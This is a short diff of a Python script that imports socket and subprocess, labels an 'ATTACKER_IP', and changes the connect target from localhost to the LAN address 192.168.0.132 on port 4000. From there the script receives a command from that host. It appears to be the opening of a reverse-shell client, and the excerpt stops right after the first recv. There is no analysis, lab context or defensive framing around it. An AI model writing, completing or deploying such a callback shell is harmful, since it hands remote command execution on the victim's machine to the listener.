@@ -1,13 +1,13 @@
 import socket
 import subprocess
 
-#ATTACKER_IP = 127.0.0.1
+#ATTACKER_IP = 192.168.0.132
 ################################################################
 ##PORT IS 4000
 
 def main():
     s = socket.socket()
-    s.connect(('127.0.0.1', 4000))
+    s.connect(('192.168.0.132', 4000))
         
     cmd = s.recv(1024).decode()
             
